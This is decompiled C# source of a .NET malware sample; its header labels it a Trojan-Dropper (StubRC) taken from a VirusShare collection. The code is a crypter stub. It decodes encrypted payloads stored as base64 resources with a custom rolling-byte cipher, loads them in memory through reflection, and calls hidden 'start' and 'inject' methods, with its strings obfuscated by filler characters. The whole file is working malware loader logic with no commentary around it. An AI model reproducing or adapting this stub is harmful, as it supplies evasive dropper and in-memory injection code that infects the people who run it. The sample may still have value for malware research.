// Decompiled with JetBrains decompiler
// Type: Federico
// Assembly: Upkate, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DE69210E-1AE1-4048-9273-F41A7CA6098A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.MSIL.StubRC.jco-65d66dfdc9b14c5733bb80e4e3f0d0f9d3f433b691177bdbdfbaaa6294b7023b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;

[StandardModule]
internal sealed class Federico
{
  public static void couuunt(string thamadafaka)
  {
    int integer = Conversions.ToInteger("2");
    if (Conversions.ToDouble("1".Replace("1", "9")) < (double) integer)
    {
      int num1 = (int) Interaction.MsgBox((object) "LOLFU", MsgBoxStyle.Information, (object) "Lolwut");
    }
    int num2 = (int) Interaction.MsgBox((object) "dapawa");
  }

  [STAThread]
  public static void Main()
  {
    ArrayList arrayList = new ArrayList();
    arrayList.Add((object) "çgçççççaçgçaç".Replace("ç", ""));
    byte[] numArray1 = Federico.ĴģĐĭģĒħıĚĚččĮĵĈĬ((byte[]) Federico.trydec(Conversions.ToString(arrayList[0])));
    arrayList.Add((object) "òbòlòaòbòlòaò".Replace("ò", ""));
    byte[] numArray2 = Federico.ĴģĐĭģĒħıĚĚččĮĵĈĬ((byte[]) Federico.trydec(Conversions.ToString(arrayList[1])));
    Federico.reflect(numArray1, new ArrayList()
    {
      (object) numArray2
    });
    Assembly.Load(numArray1).GetType("W,,,,,,,,,,,,,i,n,,,,,,,d,,,ow,,,s,,,,,A,p,,,pl,,i,,,,c,,,,,at,,io,,,,n,,,2,,,,.m,,,od,,,u,l,,,e,1,,,".Replace(",", "")).GetMethod(",,,s,,,,,,,,t,,,,,,a,,,,,,r,,t,,,,,,,u,p,,".Replace(",", "")).Invoke((object) null, new object[1]
    {
      (object) new ArrayList()
      {
        (object) ",,,,,,,,,,,,,,,,,,,,,,Upkate.exe,,,,,,,,,,".Replace(",", ""),
        (object) ",,,,,,,,,,,,,,,,,,,,,,Upkate,,,,,,,,,,".Replace(",", "")
      }
    });
  }

  public static object reflect(byte[] datas, ArrayList bytes)
  {
    RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(datas).GetType(":W:i::::nd::ow:s:Ap:::plica::t:io::n2.mo:::du::l:e::1::".Replace(":", "")).GetMethod("^^^i^^^n^je^c^^^^t^".Replace("^", "")).Invoke((object) null, new object[1]
    {
      (object) bytes
    }))));
    object obj;
    return obj;
  }

  public static object returnassembly() => (object) Assembly.GetExecutingAssembly();

  public static object dada(string shit) => (object) Convert.FromBase64String(shit);

  public static object trydec(string shitz) => Federico.dada(Conversions.ToString(new ResourceManager("qEqSqCqrqyqpqtqeqrq".Replace("q", ""), (Assembly) Federico.returnassembly()).GetObject(shitz)));

  public static byte[] ĴģĐĭģĒħıĚĚččĮĵĈĬ(byte[] ÌÏÏ)
  {
    byte[] numArray = new byte[checked (ÌÏÏ.Length - 4 + 1)];
    int num1 = (int) ÌÏÏ[0];
    int num2 = checked (ÌÏÏ.Length - 1);
    int index = 3;
    while (index <= num2)
    {
      if (num1 == (int) ÌÏÏ[1] | num1 > (int) ÌÏÏ[1])
        num1 = (int) ÌÏÏ[0];
      int num3 = checked ((int) ÌÏÏ[index] - num1);
      if (num3 < 0)
        checked { num3 += 256; }
      if (num3 > (int) byte.MaxValue)
        checked { num3 -= 256; }
      numArray[checked (index - 3)] = checked ((byte) num3);
      checked { num1 += 1 + (int) ÌÏÏ[2]; }
      checked { ++index; }
    }
    return numArray;
  }
}
